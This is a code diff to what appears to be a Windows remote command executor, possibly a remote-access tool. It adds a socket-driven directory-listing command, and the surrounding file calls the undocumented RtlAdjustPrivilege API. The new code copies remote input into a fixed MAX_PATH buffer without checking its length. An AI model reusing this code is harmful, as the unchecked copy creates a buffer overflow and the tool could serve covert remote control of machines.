@@ -4,6 +4,8 @@
 #include "Utils.h"
 #include "RemoteCommandExecutor.h"
 
+static HANDLE processHeap = NULL;
+
 //undocumented API
 //declarations
 NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
@@ -141,7 +143,39 @@ BOOL CmdCommand(SOCKET* sck, PSTR str) {
 }
 
 BOOL ListDirectoryCommand(SOCKET* sock, PSTR str) {
+	if(!processHeap)
+		processHeap = GetProcessHeap();
 
-	//check cases
+	char* content;
+
+	if (!strlen(str)) {
+		char thisDirectory[4] = { '.', '\\', '*', 0 };
+		content = GetDirectoryContent(processHeap, thisDirectory);
+		WriteConnection(sock, content);
+		HeapFree(processHeap, 0x0, content);
+	}
+	else {
+		DWORD endPosForQuotedString;
+		char* singleToken;
+		char beforeListing[MAX_PATH + sizeof("DIRECTORY: ") + 1];
+		const DWORD listingSize = MAX_PATH + sizeof("DIRECTORY: ") + 1;
+		char thisDirectory[MAX_PATH];
+
+		while ((singleToken = GetNextStringToken(str, &endPosForQuotedString))) {
+			ZeroMemory(thisDirectory, MAX_PATH);
+			memcpy(thisDirectory, singleToken, strlen(singleToken));
+			PutAnyWildcardAtString(thisDirectory);
+
+			content = GetDirectoryContent(processHeap, thisDirectory);
+			ZeroMemory(beforeListing, listingSize);
+			snprintf(beforeListing,
+				listingSize,
+				"DIRECTORY: %s\n", singleToken);
+			WriteConnection(sock, beforeListing);
+			WriteConnection(sock, content);
+			HeapFree(processHeap, 0x0, content);
+		}
+	}
+
 	return TRUE;
 }
